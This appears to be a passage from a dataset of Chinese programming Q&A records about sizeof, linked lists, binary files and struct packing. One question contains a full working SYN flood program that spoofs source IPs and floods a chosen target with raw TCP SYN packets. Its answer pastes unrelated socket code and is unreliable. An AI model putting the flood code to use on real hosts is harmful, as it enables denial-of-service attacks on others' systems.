class=\"hljs-constructor\"&gt;Init(&lt;span class=\"hljs-params\"&gt;a&lt;/span&gt;,&lt;span class=\"hljs-params\"&gt;n&lt;/span&gt;)&lt;/span&gt;;\n        printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;原数组a[]&amp;#xff1a;&amp;#34;&lt;/span&gt;);&lt;span class=\"hljs-constructor\"&gt;Print(&lt;span class=\"hljs-params\"&gt;a&lt;/span&gt;,&lt;span class=\"hljs-params\"&gt;n&lt;/span&gt;)&lt;/span&gt;;\n        &lt;span class=\"hljs-constructor\"&gt;Sort(&lt;span class=\"hljs-params\"&gt;a&lt;/span&gt;,&lt;span class=\"hljs-params\"&gt;n&lt;/span&gt;)&lt;/span&gt;;\n        printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;排序后a[]:&amp;#34;&lt;/span&gt;);&lt;span class=\"hljs-constructor\"&gt;Print(&lt;span class=\"hljs-params\"&gt;a&lt;/span&gt;,&lt;span class=\"hljs-params\"&gt;n&lt;/span&gt;)&lt;/span&gt;;\n        &lt;span class=\"hljs-constructor\"&gt;Sleep(1000)&lt;/span&gt;; \n        &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; b&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;n&lt;/span&gt;]&lt;/span&gt;;\n        &lt;span class=\"hljs-constructor\"&gt;Init(&lt;span class=\"hljs-params\"&gt;b&lt;/span&gt;,&lt;span class=\"hljs-params\"&gt;n&lt;/span&gt;)&lt;/span&gt;;\n        printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;原数组b[]&amp;#xff1a;&amp;#34;&lt;/span&gt;);&lt;span class=\"hljs-constructor\"&gt;Print(&lt;span class=\"hljs-params\"&gt;b&lt;/span&gt;,&lt;span class=\"hljs-params\"&gt;n&lt;/span&gt;)&lt;/span&gt;;\n        &lt;span class=\"hljs-constructor\"&gt;Sort(&lt;span class=\"hljs-params\"&gt;b&lt;/span&gt;,&lt;span class=\"hljs-params\"&gt;n&lt;/span&gt;)&lt;/span&gt;;\n        printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;排序后b[]:&amp;#34;&lt;/span&gt;);&lt;span class=\"hljs-constructor\"&gt;Print(&lt;span class=\"hljs-params\"&gt;b&lt;/span&gt;,&lt;span class=\"hljs-params\"&gt;n&lt;/span&gt;)&lt;/span&gt;;\n        &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; n2&amp;#61;n*&lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;; \n        &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; c&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;n2&lt;/span&gt;]&lt;/span&gt;;\n        &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt;(j&amp;lt;n)\n        {\n            c&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;j&lt;/span&gt;]&lt;/span&gt;&amp;#61;a&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;j&lt;/span&gt;]&lt;/span&gt;;\n            j&amp;#43;&amp;#43;;\n        }\n        &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt;(j&amp;lt;n2)\n        {\n            c&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;j&lt;/span&gt;]&lt;/span&gt;&amp;#61;b&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;j&lt;/span&gt;-&lt;span class=\"hljs-identifier\"&gt;n&lt;/span&gt;]&lt;/span&gt;;\n            j&amp;#43;&amp;#43;;\n        }\n        printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;原数组c[]&amp;#xff1a;&amp;#34;&lt;/span&gt;);&lt;span class=\"hljs-constructor\"&gt;Print(&lt;span class=\"hljs-params\"&gt;c&lt;/span&gt;,&lt;span class=\"hljs-params\"&gt;n2&lt;/span&gt;)&lt;/span&gt;;\n        &lt;span class=\"hljs-constructor\"&gt;Sort(&lt;span class=\"hljs-params\"&gt;c&lt;/span&gt;,&lt;span class=\"hljs-params\"&gt;n2&lt;/span&gt;)&lt;/span&gt;;\n        printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;排序后c[]&amp;#xff1a;&amp;#34;&lt;/span&gt;);&lt;span class=\"hljs-constructor\"&gt;Print(&lt;span class=\"hljs-params\"&gt;c&lt;/span&gt;,&lt;span class=\"hljs-params\"&gt;n2&lt;/span&gt;)&lt;/span&gt;;\n        return &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;    \n}\n\n\n\n\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/82341750793616.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["编写一个函数随机生成元素为0到99的长度为n的数组", ["这是题目的要求，我在做第一个函数，题目说n是数组长度，可是我不知道怎么用到那个n。我用n=sizeof（a）/sizeof（a[0])会报错。", "然后我直接不管n，定义了#define N 10，然后调用两次这个函数，生成的两个数组是一样的，这是为什么", "\n", "\n"]], "Tag": "程序设计"}
{"Answer": "```\r\n // Q704572.cpp : Defines the entry point for the console application.\r\n//\r\n\r\n#include \"stdafx.h\"\r\n\r\n#include&lt;fstream&gt; \r\n#include&lt;iostream&gt;\r\nusing namespace std;\r\nstruct student\r\n{\r\nint num;\r\nchar name[20];\r\nfloat score;\r\n};\r\nint main()\r\n{\r\nstudent stud[5] = { 1001,\"Li\",85,1002,\"Fan\",97.5,1004,\"Wang\",54,1006,\"Tan\",76.5,1010,\"Ling\",96 };\r\nfstream iofile(\"c:\\\\stud.dat\", ios::in | ios::out | ios::binary);\r\nif (!iofile)\r\n{\r\ncerr &lt;&lt; \"open error!\" &lt;&lt; endl;\r\nabort();\r\n}\r\nfor (int i = 0; i &lt; 5; i++)\r\niofile.write((char*)&amp;stud[i], sizeof(student));\r\nstudent stud1[5];\r\nfor (int i = 0; i &lt; 5; i++)\r\n{\r\niofile.seekg(i * sizeof(student), ios::beg);\r\niofile.read((char*)&amp;stud1[i], sizeof(student));\r\ncout &lt;&lt; stud1[i].num &lt;&lt; \" \" &lt;&lt; stud1[i].name &lt;&lt; \" \" &lt;&lt; stud1[i].score &lt;&lt; endl;\r\n}\r\ncout &lt;&lt; endl;\r\nstud[2].num = 1012;\r\nstrcpy_s(stud[2].name, \"Wu\");\r\nstud[2].score = 60;\r\niofile.seekg(2 * sizeof(stud[0]), ios::beg);\r\niofile.write((char*)&amp;stud[2], sizeof(stud[2]));\r\niofile.seekg(0, ios::beg);\r\nfor (int i = 0; i &lt; 5; i++)\r\n{\r\niofile.read((char*)&amp;stud[i], sizeof(stud1[i]));\r\ncout &lt;&lt; stud1[i].num &lt;&lt; \" \" &lt;&lt; stud1[i].name &lt;&lt; \" \" &lt;&lt; stud1[i].score &lt;&lt; endl;\r\n}\r\niofile.close();\r\nreturn 0;\r\n}\r\n```\r\n\r\n![图片说明](https://img-ask.csdn.net/upload/201810/28/1540704267_839259.gif)\r\n\r\n\r\n`如果问题得到解决，请点我回答右边的采纳，谢谢`\r\n\r\n---------------\r\n补充下，后面的也不对，你\r\nstud[2].num = 1012;\r\nstrcpy_s(stud[2].name, \"Wu\");\r\nstud[2].score = 60;\r\niofile.seekg(2 * sizeof(stud[0]), ios::beg);\r\niofile.write((char*)&amp;stud[2], sizeof(stud[2]));\r\n更新的是stud\r\n但是最后循环输出的是stud1，所以更新了看不到变化。\r\n这个你自己修改下吧。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["VS2017对二进制文件写入和读出是乱麻麻", ["代码：#include", "\n#include", "\nusing namespace std;", "\nstruct student", "\n{", "\n    int num;", "\n    char name[20];", "\n    float score;", "\n};", "\nint main()", "\n{", "\n    student stud[5] = { 1001,\"Li\",85,1002,\"Fan\",97.5,1004,\"Wang\",54,1006,\"Tan\",76.5,1010,\"Ling\",96 };", "\n    fstream iofile(\"stud.dat\", ios::in | ios::out | ios::binary);", "\n    if (!iofile)", "\n    {", "\n        cerr << \"open error!\" << endl;", "\n        abort();", "\n    }", "\n    for (int i = 0; i < 5; i++)", "\n        iofile.write((char*)&stud[i], sizeof(stud[i]));", "\n    student stud1[5];", "\n    for (int i = 0; i < 5; i = i + 2)", "\n    {", "\n        iofile.seekg(i * sizeof(stud[i]), ios::beg);", "\n        iofile.read((char*)&stud[i / 2], sizeof(stud1[0]));", "\n        cout << stud1[i / 2].num << \" \" << stud1[i / 2].name << \" \" << stud1[i / 2].score << endl;", "\n    }", "\n    cout << endl;", "\n    stud[2].num = 1012;", "\n    strcpy_s(stud[2].name, \"Wu\");", "\n    stud[2].score = 60;", "\n    iofile.seekg(2 * sizeof(stud[0]), ios::beg);", "\n    iofile.write((char*)&stud[2], sizeof(stud[2]));", "\n    iofile.seekg(0, ios::beg);", "\n    for (int i = 0; i < 5; i++)", "\n    {", "\n        iofile.read((char*)&stud[i], sizeof(stud1[i]));", "\n        cout << stud1[i].num << \" \" << stud1[i].name << \" \" << stud1[i].score << endl;", "\n    }", "\n    iofile.close();", "\n    return 0;", "\n}", "\n\n", "运行结果："]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;for(i&amp;#61;len-1;i&amp;lt;&amp;#61;0;i--){&lt;!-- --&gt;&lt;br /&gt;改为&lt;br /&gt;for(i&amp;#61;len-1;i&amp;gt;&amp;#61;0;i--){&lt;!-- --&gt;&lt;/p&gt;\n&lt;p&gt;你写成i&amp;lt;&amp;#61;0&amp;#xff0c;循环根本就没执行&amp;#xff0c;因为i&amp;lt;&amp;#61;0为假。所以输出不了东西&lt;/p&gt;\n&lt;p&gt;另外printList中&amp;#xff0c;while循环中第一个head &amp;#61; head-&amp;gt;next删掉。因为while前面已经写了&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么打印那串数字打印不出来啊  该怎么弄呀求解", ["#include<stdio.h>", "#include<stdlib.h>", "#define datatype int", "typedef struct ListNode", "ptrL;", "struct ListNode{", "datatype dada;", "struct ListNode", "next;", "};", "ptrL creatList(ptrL head, int a[], int len){", "    int i;", "    ptrL newNode;", "head=(ptrL)malloc(sizeof(struct ListNode));", "head->next=NULL;", "for(i=len-1;i<=0;i--){", "newNode=(ptrL)malloc(sizeof(struct ListNode));", "newNode->dada=a[i];", "newNode->next=head->next;", "head->next=newNode;", "\n", "}", "return head;", "}", "\n", "void printList(ptrL head){", "    head=head->next;", "while(head!=NULL){", "    head=head->next;", "printf(\"%d \",head->dada);", "head=head->next ;", "\n", "}", "printf(\"--------\\n\");", "}", "\n", "int main(){", "    int a[]={1,5,4,2,6,8,9};", "int len=sizeof(a)/sizeof(int);", "ptrL newList= creatList( newList, a, len);", "printList(newList);", "return 0;", "}"]], "Tag": "程序设计"}
{"Answer": "你就不能把x,y 放到一个结构体里，一次性写到管道里吗", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["怎么通过FIFO管道传送多个数值？", ["我想把 x=1.11, y=2.22, 通过FIFO传输。", "\n写端：", "\n\n", "    sprintf(buf,\"%f\",x);\n    write(writefd,buf,sizeof(buf));\n\n    sprintf(buf,\"%f\",y);\n    write(writefd,buf,sizeof(buf));\n", "\n\n", "读端：", "\n\n", "    read(readfd,buf,sizeof(buf));\n    float x=atof(buf);\n    printf(\"x=%f\\n\",x);\n\n    read(readfd,buf,sizeof(buf));\n    float y=atof(buf);\n    printf(\"y=%f\\n\",y);\n\n", "\n\n", "结果 x=1.110000  y=1.110000", "\n出了哪些错误？怎么写比较好？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;ListNode listNode中你的数据类型为ListNode&amp;#xff0c;这个类型是你自己通过基本数据类型复合而来&amp;#xff0c;可以看做和int/float等类型相同。&lt;/p&gt;\n\n&lt;p&gt;int a和ListNode a本质是一样的&amp;#xff0c;都是定义了一个变量并且系统为他分配了内存&amp;#xff0c;这个a和系统分配的地址已经绑定&amp;#xff0c;无法改变。&lt;/p&gt;\n\n&lt;p&gt;l&amp;#61;(ListNode)malloc(sizeof(ListNode))这句&amp;#xff0c;我是觉得有些问题的&amp;#xff0c;当然&amp;#xff0c;不是说不能用&amp;#xff0c;malloc左右两边的类型一致&amp;#xff0c;表明你的l是ListNode l这样定义的&amp;#xff0c;在你定义的时候系统已经分配内存了&amp;#xff0c;再去申请内存似乎没有必要。&lt;/p&gt;\n\n&lt;p&gt;用malloc函数的情况通常为 ListNode *l &amp;#61; (ListNode *)malloc(sizeof(ListNode))这样用的。因为光定义指针就只相当于你给一个指针起了个名字&amp;#xff0c;这个指针指向的类型为ListNode。你申请内存&amp;#xff0c;然后系统给了你一个地址&amp;#xff0c;你的这个指针指向这个地址&amp;#xff0c;以后&amp;#xff0c;你的这个指针还可以指向其他的地址。上面那种定义是名字和地址绑定了&amp;#xff0c;不可改变。&lt;/p&gt;\n\n&lt;p&gt;malloc函数常用于指针类型的内存申请&amp;#xff0c;系统分配内存&amp;#xff0c;让指针指向这个内存所在的地址&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["如图 c语言简单问题 谢谢", ["\n", "typedef struct ListNode{\n\tint date;\n\tstruct ListNode *next;\n}ListNode;\n\n\n\nint main(int argc, char *argv[])\n{\n\tListNode listNode;\n\treturn 0;\n}", "\n\n", "上边这段代码 ，请问我main函数中ListNode listNode；这句代表这什么？开辟了一块定义好结构体的内存吗？", "\n\n", "那这这段代码中l=(ListNode)malloc(sizeof(ListNode));这个又代表了什么？", "\n\n", " ", "\n\n", " "]], "Tag": "程序设计"}
{"Answer": "百度上说是权限不足！\r\n\r\n程序的权限不够，应用管理员权限打开程序运行方可。\r\n\r\n\r\n\r\n#include &lt;iostream&gt;\r\n#include &lt;stdio.h&gt;\r\n#include &lt;winsock.h&gt;\r\n#include &lt;fstream&gt;\r\n#include &lt;string.h&gt;\r\nusing namespace std;\r\n/************************************************************************/\r\n/* c语言 socket方式获取网页源码                                              */\r\n/************************************************************************/\r\nint geturl(char *url) \r\n{ \r\n\tWSADATA WSAData={0}; \r\n\tSOCKET sockfd; \r\n\tstruct sockaddr_in addr; \r\n\tstruct hostent *pURL; \r\n\tchar myurl[BUFSIZ]; \r\n\tchar *pHost = 0, *pGET = 0; \r\n\tchar host[BUFSIZ], GET[BUFSIZ]; \r\n\tchar header[BUFSIZ] = \"\"; \r\n\tstatic char text[BUFSIZ+1];\r\n\tint iRet = -100;\r\n\tint ilen=0;\r\n\t/* \r\n\t* windows下使用socket必须用WSAStartup初始化，否则不能调用 \r\n\t*/ \r\n\tif(WSAStartup(MAKEWORD(2,2), &amp;WSAData))\t\t\t//加载socket 2.2通讯协议库\r\n\t{ \r\n\t\tprintf(\"WSA failed\\n\"); \r\n\t\treturn -1; \r\n\t} \r\n\r\n\tstrcpy(myurl, url); \r\n\tfor (pHost = myurl; *pHost != '/' &amp;&amp; *pHost != '\\0'; ++pHost); \r\n\tif ( (int)(pHost - myurl) == strlen(myurl) ) \r\n\t\tstrcpy(GET, \"/\"); \r\n\telse \r\n\t\tstrcpy(GET, pHost); \r\n\t*pHost = '\\0'; \r\n\tstrcpy(host, myurl); \r\n\tprintf(\"%s\\n%s\\n\", host, GET); \r\n\t//\t\t\tgetprotobyname(\"tcp\");\t\t\t\t\t\t//返回对应于给定协议名的相关协议信息。\t\r\n\tsockfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);\t\t//建立socket通讯\r\n\tif (sockfd&lt;0)\r\n\t{\r\n\t\tT_SaveLog_KF(\"打开sockfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);失败\");\r\n\t\tprintf_my(\"打开sockfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);失败\");\r\n\t\treturn -2;\r\n\t}\r\n\tpURL = gethostbyname(host);\t\t\t\t\t\t\t\t//gethostbyname()函数说明——用域名或主机名获取IP地址\r\n\tif (pURL==NULL)\r\n\t{\r\n\t\tT_SaveLog_KF(\"用域名或主机名获取IP地址失败！下面将无法设置（addr.sin_family = AF_INET; addr.sin_addr.s_addr = *((unsigned long*)pURL-&gt;h_addr); addr.sin_port = htons(80); ）pURL = gethostbyname(host);\");\r\n\t\tprintf_my(\"用域名或主机名获取IP地址失败！下面将无法设置（addr.sin_family = AF_INET; addr.sin_addr.s_addr = *((unsigned long*)pURL-&gt;h_addr); addr.sin_port = htons(80); ）pURL = gethostbyname(host);\");\r\n\t\treturn -3;\r\n\t}\r\n\r\n\taddr.sin_family = AF_INET; \r\n\taddr.sin_addr.s_addr = *((unsigned long*)pURL-&gt;h_addr); \r\n\taddr.sin_port = htons(80); \r\n\tstrcat(header, \"GET \"); \r\n\tstrcat(header, GET); \r\n\tstrcat(header, \" HTTP/1.1\\r\\n\"); \r\n\tstrcat(header, \"HOST: \"); \r\n\tstrcat(header, host); \r\n\tstrcat(header, \"\\r\\nConnection: Close\\r\\n\\r\\n\");\t\t// \"GET / HTTP/1.1\\r\\nHOST: www.baidu.com\\r\\nConnection:Clos\\r\\n\" \r\n\tiRet = connect(sockfd,(SOCKADDR *)&amp;addr,sizeof(addr)); \r\n\tif (iRet != 0)\r\n\t{\r\n\t\tT_SaveLog_KF(\"连接失败：connect(sockfd,(SOCKADDR *)&amp;addr,sizeof(addr));\");\r\n\t\tprintf_my(\"连接失败：connect(sockfd,(SOCKADDR *)&amp;addr,sizeof(addr));\");\r\n\t\tWSAGetLastError();\r\n\t\treturn -4;\r\n\t}\r\n\tsend(sockfd, header, strlen(header), 0);\t//发送请求\r\n\t//ofstream fout(\"saveHTMLfile.html\");\r\n\tofstream fout(\"saveHTMLfile.html\",ios::app|ios::in);\t//追加方式若文件不存在则创建\r\n\tmemset(text,'\\0',sizeof(text));\r\n\twhile ( recv(sockfd, text, BUFSIZ, 0) &gt; 0)\t//接受请求信息返回的数据\r\n\t{ \r\n\t\tfout&lt;&lt;text;\r\n\t\tcout&lt;&lt;text;\r\n\t\t//strnset(text, '\\0', BUFSIZ);\r\n\t\tstrnset(text, '\\0', ilen = strlen(text)+1);\r\n\t} \r\n\tclosesocket(sockfd); \r\n\tWSACleanup();\t//释放加载的socket 库资源\r\n\treturn 0;\r\n}", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于洪水攻击原理C++代码实现的问题 ", ["#include ", "\n\n", "#include ", "\n\n", "#include ", "\n\n", "#include ", "\n\n", "#define SEQ 0x28376839 ", "\n\n", "#define SYN_DEST_IP \"127.0.0.1\"//被攻击的IP ", "\n\n", "#define FAKE_IP \"10.168.150.1\" //伪装IP的起始值，本程序的伪装IP覆盖一个B类网段 ", "\n\n", "#define STATUS_FAILED 0xFFFF//错误返回值 ", "\n\n", "#pragma comment(lib, \"Ws2_32.lib\")", "\n\n", "typedef struct _iphdr//定义IP首部 ", "\n\n", "{ ", "\n\n", "unsigned char h_verlen;//4位首部长度,4位IP版本号 ", "\n\n", "unsigned char tos; //8位服务类型TOS ", "\n\n", "unsigned short total_len;//16位总长度（字节） ", "\n\n", "unsigned short ident;//16位标识 ", "\n\n", "unsigned short frag_and_flags;//3位标志位 ", "\n\n", "unsigned char ttl;//8位生存时间 TTL ", "\n\n", "unsigned char proto; //8位协议 (TCP, UDP 或其他) ", "\n\n", "unsigned short checksum;//16位IP首部校验和 ", "\n\n", "unsigned int sourceIP;//32位源IP地址 ", "\n\n", "unsigned int destIP; //32位目的IP地址 ", "\n\n", "}IP_HEADER; ", "\n\n", "struct//定义TCP伪首部 ", "\n\n", "{ ", "\n\n", "unsigned long saddr; //源地址 ", "\n\n", "unsigned long daddr; //目的地址 ", "\n\n", "char mbz; ", "\n\n", "char ptcl; //协议类型 ", "\n\n", "unsigned short tcpl; //TCP长度 ", "\n\n", "}psd_header; ", "\n\n", "typedef struct _tcphdr //定义TCP首部 ", "\n\n", "{ ", "\n\n", "USHORT th_sport; //16位源端口 ", "\n\n", "USHORT th_dport; //16位目的端口 ", "\n\n", "unsigned int th_seq; //32位序列号 ", "\n\n", "unsigned int th_ack; //32位确认号 ", "\n\n", "unsigned char th_lenres;//4位首部长度/6位保留字 ", "\n\n", "unsigned char th_flag;//6位标志位 ", "\n\n", "USHORT th_win; //16位窗口大小 ", "\n\n", "USHORT th_sum; //16位校验和 ", "\n\n", "USHORT th_urp; //16位紧急数据偏移量 ", "\n\n", "}TCP_HEADER; ", "\n\n", "//CheckSum:计算校验和的子函数 ", "\n\n", "USHORT checksum(USHORT *buffer, int size) ", "\n\n", "{ ", "\n\n", "unsigned long cksum=0; ", "\n\n", "while(size >1) { ", "\n\n", "cksum+=*buffer++; ", "\n\n", "size -=sizeof(USHORT); ", "\n\n", "} ", "\n\n", "if(size ) { ", "\n\n", "cksum += ", "(UCHAR", ")buffer; ", "\n\n", "} ", "\n\n", "cksum = (cksum >> 16) + (cksum & 0xffff); ", "\n\n", "cksum += (cksum >>16); ", "\n\n", "return (USHORT)(~cksum); ", "\n\n", "} ", "\n\n", "//SynFlood主函数 ", "\n\n", "int main(int argc, char **argv) ", "\n\n", "{ ", "\n\n", "int datasize,ErrorCode,counter,flag,FakeIpNet,FakeIpHost; ", "\n\n", "int TimeOut=2000,SendSEQ=0; ", "\n\n", "char SendBuf[128]; ", "\n\n", "char DestIP[16];", "\n\n", "memset(DestIP, 0, 4);", "\n  if(argc < 2)", "\n     strcpy(DestIP, SYN_DEST_IP);", "\n  else", "\n     strcpy(DestIP, argv[1]);", "\n  WSADATA wsaData; ", "\n\n", "SOCKET SockRaw=(SOCKET)NULL; ", "\n\n", "struct sockaddr_in DestAddr; ", "\n\n", "IP_HEADER ip_header; ", "\n\n", "TCP_HEADER tcp_header; ", "\n\n", "//初始化SOCK_RAW ", "\n\n", "if((ErrorCode=WSAStartup(MAKEWORD(2,1),&wsaData))!=0){ ", "\n\n", "fprintf(stderr,\"WSAStartup failed: %d\\n\",ErrorCode); ", "\n\n", "ExitProcess(STATUS_FAILED); ", "\n\n", "} ", "\n\n", "SockRaw=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED); ", "\n\n", "if (SockRaw==INVALID_SOCKET){ ", "\n\n", "fprintf(stderr,\"WSASocket() failed: %d\\n\",WSAGetLastError()); ", "\n\n", "ExitProcess(STATUS_FAILED); ", "\n\n", "} ", "\n\n", "flag=TRUE; ", "\n\n", "//设置IP_HDRINCL以自己填充IP首部 ", "\n\n", "ErrorCode=setsockopt(SockRaw,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(int)); ", "\n\n", "if (ErrorCode==SOCKET_ERROR)printf(\"Set IP_HDRINCL Error!\\n\"); ", "\n\n", "__try{ ", "\n\n", "//设置发送超时 ", "\n\n", "ErrorCode=setsockopt(SockRaw,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut)); ", "\n\n", "if(ErrorCode==SOCKET_ERROR){ ", "\n\n", "fprintf(stderr,\"Failed to set send TimeOut: %d\\n\",WSAGetLastError()); ", "\n\n", "__leave; ", "\n\n", "} ", "\n\n", "memset(&DestAddr,0,sizeof(DestAddr)); ", "\n\n", "DestAddr.sin_family=AF_INET; ", "\n\n", "DestAddr.sin_addr.s_addr=inet_addr(DestIP); ", "\n\n", "FakeIpNet=inet_addr(FAKE_IP); ", "\n\n", "FakeIpHost=ntohl(FakeIpNet); ", "\n\n", "//填充IP首部 ", "\n\n", "ip_header.h_verlen=(4<<4 | sizeof(ip_header)/sizeof(unsigned long)); ", "\n\n", "//高四位IP版本号，低四位首部长度 ", "\n\n", "ip_header.total_len=htons(sizeof(IP_HEADER)+sizeof(TCP_HEADER)); //16位总长度（字节） ", "\n\n", "ip_header.ident=1; //16位标识 ", "\n\n", "ip_header.frag_and_flags=0; //3位标志位 ", "\n  ip_header.ttl=128; //8位生存时间TTL ", "\n\n", "ip_header.proto=IPPROTO_TCP;//8位协议(TCP,UDP…) ", "\n\n", "ip_header.checksum=0;//16位IP首部校验和 ", "\n\n", "ip_header.sourceIP=htonl(FakeIpHost+SendSEQ);//32位源IP地址 ", "\n\n", "ip_header.destIP=inet_addr(DestIP); //32位目的IP地址 ", "\n\n", "//填充TCP首部 ", "\n\n", "tcp_header.th_sport=htons(7000);//源端口号 ", "\n\n", "tcp_header.th_dport=htons(8080);//目的端口号 ", "\n\n", "tcp_header.th_seq=htonl(SEQ+SendSEQ);//SYN序列号 ", "\n\n", "tcp_header.th_ack=0; //ACK序列号置为0 ", "\n\n", "tcp_header.th_lenres=(sizeof(TCP_HEADER)/4<<4|0);//TCP长度和保留位 ", "\n\n", "tcp_header.th_flag=2;//SYN 标志 ", "\n\n", "tcp_header.th_win=htons(16384); //窗口大小 ", "\n\n", "tcp_header.th_urp=0; //偏移 ", "\n\n", "tcp_header.th_sum=0; //校验和 ", "\n\n", "//填充TCP伪首部（用于计算校验和，并不真正发送） ", "\n\n", "psd_header.saddr=ip_header.sourceIP;//源地址 ", "\n\n", "psd_header.daddr=ip_header.destIP;//目的地址 ", "\n\n", "psd_header.mbz=0; ", "\n\n", "psd_header.ptcl=IPPROTO_TCP;//协议类型 ", "\n\n", "psd_header.tcpl=htons(sizeof(tcp_header));//TCP首部长度 ", "\n  printf(\"%s\\n\", DestIP);", "\n\n", "while(1) { ", "\n\n", "//每发送10000个报文输出一个标示符 ", "\n\n", "printf(\".\"); ", "\n\n", "for(counter=0;counter<10000;counter++){ ", "\n\n", "if(SendSEQ++==65536) SendSEQ=1;//序列号循环 ", "\n\n", "//更改IP首部 ", "\n\n", "ip_header.checksum=0;//16位IP首部校验和 ", "\n\n", "ip_header.sourceIP=htonl(FakeIpHost+SendSEQ);//32位源IP地址 ", "\n\n", "//更改TCP首部 ", "\n\n", "tcp_header.th_seq=htonl(SEQ+SendSEQ);//SYN序列号 ", "\n\n", "tcp_header.th_sum=0; //校验和 ", "\n\n", "//更改TCP Pseudo Header ", "\n\n", "psd_header.saddr=ip_header.sourceIP; ", "\n\n", "//计算TCP校验和，计算校验和时需要包括TCP pseudo header ", "\n\n", "memcpy(SendBuf,&psd_header,sizeof(psd_header)); ", "\n\n", "memcpy(SendBuf+sizeof(psd_header),&tcp_header,sizeof(tcp_header)); ", "\n\n", "tcp_header.th_sum=checksum((USHORT *)SendBuf,sizeof(psd_header)+sizeof(tcp_header)); ", "\n\n", "//计算IP校验和 ", "\n\n", "memcpy(SendBuf,&ip_header,sizeof(ip_header)); ", "\n\n", "memcpy(SendBuf+sizeof(ip_header),&tcp_header,sizeof(tcp_header)); ", "\n\n", "memset(SendBuf+sizeof(ip_header)+sizeof(tcp_header),0,4); ", "\n\n", "datasize=sizeof(ip_header)+sizeof(tcp_header); ", "\n\n", "ip_header.checksum=checksum((USHORT *)SendBuf,datasize); ", "\n\n", "//填充发送缓冲区 ", "\n\n", "memcpy(SendBuf,&ip_header,sizeof(ip_header)); ", "\n\n", "//发送TCP报文 ", "\n\n", "ErrorCode=sendto(SockRaw, ", "\n\n", "SendBuf, ", "\n\n", "datasize, ", "\n\n", "0, ", "\n\n", "(struct sockaddr*) &DestAddr, ", "\n\n", "sizeof(DestAddr)); ", "\n\n", "if (ErrorCode==SOCKET_ERROR) printf(\"\\nSend Error:%d\\n\",GetLastError()); ", "\n\n", "}//End of for ", "\n\n", "}//End of While ", "\n\n", "}//End of try ", "\n\n", "__finally { ", "\n\n", "if (SockRaw != INVALID_SOCKET) closesocket(SockRaw); ", "\n\n", "WSACleanup(); ", "\n\n", "} ", "\n\n", "return 0; ", "\n\n", "} ", "\n\n", "运行后只出现WSASocket() failed: 10013这样的结果 想知道是什么问题"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;So, per &lt;a href=\"https://github.com/golang/go/wiki/cgo#struct-alignment-issues\" rel=\"nofollow noreferrer\"&gt;https://github.com/golang/go/wiki/cgo#struct-alignment-issues&lt;/a&gt;: &lt;/p&gt;\n\n&lt;p&gt;&lt;em&gt;Go doesn't support packed struct (e.g., structs where maximum alignment is 1 byte), you can't use packed C struct in Go. Even if your program passes compilation, it won't do what you want. To use it, &lt;strong&gt;you have to read/write the struct as byte array/slice&lt;/strong&gt;.&lt;/em&gt;&lt;/p&gt;\n\n&lt;p&gt;From \"what\" I understood, I've put together this: &lt;a href=\"https://play.golang.org/p/OmdMVDMikSn\" rel=\"nofollow noreferrer\"&gt;https://play.golang.org/p/OmdMVDMikSn&lt;/a&gt;. &lt;/p&gt;\n\n&lt;p&gt;Essentially, set up the struct, and &lt;code&gt;binary.Write&lt;/code&gt; it into a byte slice, the slice shows 10 bytes.&lt;/p&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["golang：打包一个结构", ["\n\n", "Please consider this sample go code:", "\n\n", "package main\n\n//#include <stdio.h>\n//#include <stdint.h>\n//#pragma pack(push, 1)\n//struct Packed_Struct {\n//  uint16_t A;\n//  uint16_t B;\n//  uint32_t C;\n//  uint16_t D;\n//};\n//#pragma pack(pop)\n//\n//struct UnPacked_Struct {\n//  uint16_t A;\n//  uint16_t B;\n//  uint32_t C;\n//  uint16_t D;\n//};\n//\n//\n//void print_C_struct_size(){\n//  struct Packed_Struct Packed_Struct;\n//  struct UnPacked_Struct UnPacked_Struct;\n//  printf(\"Sizeof Packed_Struct: %lu\n\", sizeof(Packed_Struct) );\n//  printf(\"Sizeof UnPacked_Struct: %lu\n\", sizeof(UnPacked_Struct) );\n//  